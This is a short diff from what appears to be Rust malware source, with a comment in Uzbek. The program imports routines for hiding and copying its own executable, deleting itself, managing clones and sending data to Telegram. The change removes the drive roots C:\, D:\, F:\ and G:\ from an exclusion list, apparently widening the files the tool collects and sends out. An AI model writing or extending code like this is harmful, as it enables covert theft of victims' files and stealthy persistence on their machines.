@@ -15,16 +15,12 @@ use file_utils::{collect_paths, copy_and_hide_exe, delete_self};
 use process::manage_clones;
 use telegram::send_to_telegram;
 
-const EXCLUDED_PATHS: [&str; 9] = [
+const EXCLUDED_PATHS: [&str; 5] = [
     "C:\\Windows",
     "C:\\Program Files",
     "C:\\Program Files (x86)",
     "\\.git\\",
     "$RECYCLE.BIN",
-    "C:\\",
-    "D:\\",
-    "F:\\",
-    "G:\\",
 ];
 
 const BASE_PORT: u16 = 12345; // Boshlang'ich port, har bir instance uchun +i
